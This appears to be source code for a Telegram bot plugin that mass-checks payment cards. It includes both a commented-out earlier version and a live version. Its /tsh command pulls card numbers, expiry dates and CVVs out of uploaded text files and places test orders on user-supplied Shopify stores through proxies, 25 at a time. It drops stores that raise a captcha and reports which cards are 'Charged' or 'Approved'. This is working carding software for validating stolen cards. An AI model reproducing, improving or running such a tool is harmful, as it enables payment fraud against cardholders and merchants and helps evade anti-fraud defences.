# from pyrogram import Client, filters
# from pyrogram.types import Message
# from BOT.Charge.Shopify.slf.slf import check_card
# import json
# import re
# import asyncio
# import time

# def extract_cards_from_text(text: str):
#     pattern = r'(\d{13,16})[^0-9]*(\d{1,2})[^0-9]*(\d{2,4})[^0-9]*(\d{3,4})'
#     found = re.findall(pattern, text)
#     cleaned = []

#     for card in found:
#         cc, mm, yy, cvv = card
#         mm = mm.zfill(2)
#         yy = "20" + yy if len(yy) == 2 else yy
#         cleaned.append(f"{cc}|{mm}|{yy}|{cvv}")

#     return list(dict.fromkeys(cleaned))

# def get_user_site_info(user_id):
#     try:
#         with open("DATA/txtsite.json", "r") as f:
#             data = json.load(f)
#         return data.get(str(user_id), [])
#     except Exception:
#         return []

# def get_site_and_gate(user_id, index):
#     sites = get_user_site_info(user_id)
#     if not sites:
#         return None, None
#     item = sites[index % len(sites)]
#     return item.get("site"), item.get("gate")


# @Client.on_message(filters.command("tsh") & filters.reply)
# async def tsh_handler(client: Client, message: Message):
#     if not message.reply_to_message.document:
#         return await message.reply("Reply to a valid text file containing cards.")

#     file = await message.reply_to_message.download()
#     with open(file, "r", encoding="utf-8", errors="ignore") as f:
#         text = f.read()

#     cards = extract_cards_from_text(text)
#     total_cards = len(cards)

#     if total_cards == 0:
#         return await message.reply("No valid cards found in the file.")

#     if total_cards > 500:
#         cards = cards[:500]

#     await message.reply(f"✅ Found {len(cards)} cards.\n⚠️ Limit: 500 cards\n⏳ Starting check...")

#     user_id = message.from_user.id
#     user = message.from_user
#     sites = get_user_site_info(user_id)

#     if not sites:
#         return await message.reply("❌ No sites configured. Use /txturl to add sites.")

#     async def process_card(index, card):
#         site, gate = get_site_and_gate(user_id, index)
#         if not site:
#             return None

#         start = time.time()
#         raw_response = await check_card(user_id, card, site=site)
#         end = time.time()

#         if "ORDER_PLACED" in raw_response or "Thank You" in raw_response:
#             status_flag = "Charged 💎"
#         elif any(keyword in raw_response for keyword in [
#             "3D CC", "MISMATCHED_BILLING", "MISMATCHED_PIN", "MISMATCHED_ZIP", "INSUFFICIENT_FUNDS",
#             "INVALID_CVC", "INCORRECT_CVC", "3DS_REQUIRED", "MISMATCHED_BILL", "3D_AUTHENTICATION",
#             "INCORRECT_ZIP", "INCORRECT_ADDRESS"
#         ]):
#             status_flag = "Approved ❎"
#         else:
#             status_flag = "Declined ❌"

#         elapsed = end - start

#         return (
#             f"<b>#AutoShopify | Sync ✦[SELF TEXT]</b>\n"
#             f"━━━━━━━━━━━━━\n"
#             f"<b>⌁ Card:</b> <code>{card}</code>\n"
#             f"<b>⌁ Status:</b> <code>{status_flag}</code>\n"
#             f"<b>⌁ Response:</b> <code>{raw_response}</code>\n"
#             f"<b>⌁ Gateway:</b> <code>{gate}</code>\n"
#             f"━━━━━━━━━━━━━\n"
#             f"[•] Checked By: {user.mention}\n"
#             f"[•] T/t: <code>{elapsed:.2f}</code> | P/x: <code>[Live👌🏻]</code>"
#         )

#     async def run_batches(cards, batch_size=25):
#         for i in range(0, len(cards), batch_size):
#             batch = cards[i:i + batch_size]
#             tasks = [process_card(index + i, card) for index, card in enumerate(batch)]
#             results = await asyncio.gather(*tasks)

#             for result in results:
#                 if result:
#                     await message.reply(result)

#     await run_batches(cards)

from pyrogram import Client, filters
from pyrogram.types import Message
from BOT.Charge.Shopify.slf.slf import check_card
from BOT.helper.permissions import check_private_access, load_allowed_groups, is_premium_user
from BOT.tools.proxy import get_proxy
import json
import re
import asyncio
import time

def extract_cards_from_text(text: str):
    pattern = r'(\d{13,16})[^0-9]*(\d{1,2})[^0-9]*(\d{2,4})[^0-9]*(\d{3,4})'
    found = re.findall(pattern, text)
    cleaned = []

    for card in found:
        cc, mm, yy, cvv = card
        mm = mm.zfill(2)
        yy = "20" + yy if len(yy) == 2 else yy
        cleaned.append(f"{cc}|{mm}|{yy}|{cvv}")

    return list(dict.fromkeys(cleaned))

def get_user_site_info(user_id):
    try:
        with open("DATA/txtsite.json", "r") as f:
            data = json.load(f)
        return data.get(str(user_id), [])
    except Exception:
        return []

def get_site_and_gate(user_id, index):
    sites = get_user_site_info(user_id)
    if not sites:
        return None, None
    item = sites[index % len(sites)]
    return item.get("site"), item.get("gate")


@Client.on_message(filters.command("tsh") & filters.reply)
async def tsh_handler(client: Client, m: Message):
    if not m.reply_to_message.document:
        return await m.reply("Reply to a valid text file containing cards.")

    file = await m.reply_to_message.download()
    with open(file, "r", encoding="utf-8", errors="ignore") as f:
        text = f.read()

    cards = extract_cards_from_text(text)
    total_cards = len(cards)

    if total_cards == 0:
        return await m.reply("No valid cards found in the file.")

    if total_cards > 500:
        cards = cards[:500]
    total_cards = len(cards)

    user_id = m.from_user.id
    user = m.from_user
    sites = get_user_site_info(user_id)

    if not sites:
        return await m.reply("❌ No sites configured. Use /txturl to add sites.")

    if not await is_premium_user(m):
        return

    if not await check_private_access(m):
        return

    proxy = get_proxy(user_id)
    if proxy == None:
        return await m.reply(
            "<pre>Proxy Error ❗️</pre>\n"
            "<b>~ Message :</b> <code>You Have To Add Proxy For Mass checking</code>\n"
            "<b>~ Command  →</b> <b>/setpx</b>\n",
            reply_to_message_id=m.id
        )

    site, gate = get_site_and_gate(user_id, 0)

    # Step 1: Send "Preparing" message
    status_msg = await m.reply("<pre>Preparing For Check</pre>")

    start_time = time.time()
    checked_count = 0
    charged_count = 0
    approved_count = 0
    dead_count = 0

    async def update_progress():
        elapsed = time.time() - start_time
        await status_msg.edit_text(
            f"<pre>Check Started</pre>\n"
            f"━━━━━━━━━━━━━\n"
            f"⊙ <b>Total CC     :</b> <code>{total_cards}</code>\n"
            f"⊙ <b>Progress     :</b> <code>{checked_count}/{total_cards}</code> ✅\n"
            f"⊙ <b>Time Elapsed :</b> <code>{elapsed:.2f}s</code> ⏱\n"
            f"━━━━━━━━━━━━━\n"
            f"[ﾒ] <b>Checked By:</b> {user.mention}\n"
            f"⌥ <b>Dev:</b> <code>Chr1shtopher</code>"
        )
    

    await update_progress()  # Initial edit

    sem = asyncio.Semaphore(25)
    lock = asyncio.Lock()

    async def process_card(index, card):
        nonlocal checked_count, charged_count, approved_count, dead_count

        async with sem:
            site, gate = get_site_and_gate(user_id, index)
            if not site:
                async with lock:
                    checked_count += 1
                    await update_progress()
                return

            t1 = time.time()
            raw_response = await check_card(user_id, card, site=site)
            t2 = time.time()
            elapsed = t2 - t1

            async with lock:
                checked_count += 1
                if checked_count % 25 == 0 or checked_count == total_cards:
                    await update_progress()

            if "HCAPTCHA DETECTED" in raw_response.upper():
                with open("DATA/txtsite.json", "r") as f:
                    all_sites = json.load(f)

                user_sites = all_sites.get(str(user.id), [])

                # filter out the site
                new_user_sites = [s for s in user_sites if s.get("site") != site]

                if len(new_user_sites) < len(user_sites):  # site was removed
                    all_sites[str(user.id)] = new_user_sites
                    with open("DATA/txtsite.json", "w") as f:
                        json.dump(all_sites, f, indent=4)

                    await m.reply_text(f"<b>{site}</b> Has Been Removed\nDue to Captcha ⚠️")

                    if not new_user_sites:
                        await m.reply_text("❌ All sites removed due to Captcha. Checking stopped.")
                        return


            # decide if card should be reported
            if "ORDER_PLACED" in raw_response or "Thank You" in raw_response:
                status_flag = "Charged 💎"
                async with lock:
                    charged_count += 1
            elif any(keyword in raw_response for keyword in [
                "3D CC", "MISMATCHED_BILLING", "MISMATCHED_PIN", "MISMATCHED_ZIP", "INSUFFICIENT_FUNDS",
                "INVALID_CVC", "INCORRECT_CVC", "3DS_REQUIRED", "MISMATCHED_BILL", "3D_AUTHENTICATION",
                "INCORRECT_ZIP", "INCORRECT_ADDRESS"
            ]):
                status_flag = "Approved ❎"
                async with lock:
                    approved_count += 1
            else:
                status_flag = "Declined ❌"
                async with lock:
                    dead_count += 1

            message = (
                f"<b>#AutoShopify | Sync ✦[SELF TEXT]</b>\n"
                f"━━━━━━━━━━━━━\n"
                f"<b>⌁ Card:</b> <code>{card}</code>\n"
                f"<b>⌁ Status:</b> <code>{status_flag}</code>\n"
                f"<b>⌁ Response:</b> <code>{raw_response}</code>\n"
                f"<b>⌁ Gateway:</b> <code>{gate}</code>\n"
                f"━━━━━━━━━━━━━\n"
                f"[•] Checked By: {user.mention}\n"
                f"[•] T/t: <code>{elapsed:.2f}</code> | P/x: <code>[Live👌🏻]</code>"
            )

            if status_flag in ["Charged 💎", "Approved ❎"]:
                await m.reply(message)


    tasks = [asyncio.create_task(process_card(i, card)) for i, card in enumerate(cards)]

    for task in asyncio.as_completed(tasks):
        await task

    total_time = time.time() - start_time

    summary_text = (
        f"<b>✅ Summary of Check</b>\n"
        f"━━━━━━━━━━━━━\n"
        f"⊙ <b>Total:</b> <code>{total_cards}</code>\n"
        f"⊙ <b>Charged 💎:</b> <code>{charged_count}</code>\n"
        f"⊙ <b>Approved ❎:</b> <code>{approved_count}</code>\n"
        f"⊙ <b>Declined ❌:</b> <code>{total_cards - (charged_count + approved_count)}</code>\n"
        f"━━━━━━━━━━━━━\n"
        f"⌛ <b>Time Taken:</b> <code>{total_time:.2f}s</code>"
    )

    await m.reply_to_message.reply(summary_text)
